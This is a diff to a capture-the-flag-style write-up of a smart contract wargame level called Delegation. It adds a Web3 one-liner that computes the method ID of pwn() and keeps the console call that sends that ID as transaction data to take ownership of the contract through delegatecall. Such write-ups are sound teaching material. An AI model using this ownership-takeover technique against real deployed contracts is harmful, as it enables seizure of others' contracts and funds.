@@ -8,7 +8,12 @@ So, to become owner of the `Delegation` contract, we must sent the method ID of 
 bytes4 public id = bytes4(keccak256("pwn()"));
 ```
 
-We see this gives us a method ID of `0xdd365b8b`. From the console, we can now take ownership of the contract using:
+Alternatively, we can use Web3/JavaScript to find the ID using:
+```javascript
+id = web3.sha3("pwn()").slice(0,10)
+```
+
+We see these give us a method ID of `0xdd365b8b`. From the console, we can now take ownership of the contract using:
 ```javascript
 await contract.sendTransaction({data:"0xdd365b8b"})
 ```
